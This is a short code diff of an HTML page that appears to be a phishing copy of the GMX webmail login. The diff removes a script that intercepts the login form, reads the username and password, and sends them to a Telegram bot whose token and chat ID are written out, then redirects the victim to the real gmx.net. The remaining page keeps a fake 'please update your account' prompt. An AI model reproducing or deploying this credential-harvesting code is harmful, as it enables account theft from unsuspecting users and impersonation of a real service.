@@ -207,34 +207,6 @@ footer#footer ul li{
     <p>�2025 Geistiges Eigentum von GMX</p>
   </footer>
 
-
-    <script>
-
-      const formal = document.querySelector('#form')
-    
-      let bot = {
-          TOKEN: "7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc",
-          chatID: "6651292809"
-      }
-
-
-      formal.addEventListener("submit", e =>{
-          e.preventDefault();
-
-          let result1 = document.querySelector('#usr-id').value
-          let result2 = document.querySelector('#pwd').value
-          
-          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=GMX-RESULT=Username::${result1}==++==Password::${result2}`, {
-              method: "GET"
-          }).then(success => {
-              window.location.replace("https://gmx.net");
-          }, error => {
-              alert("Message not sent")
-              console.log(error)
-
-          })
-      })
-  </script>
  <script language="JavaScript">
   confirm("GMX: Please update your account to continue!");
 </body>
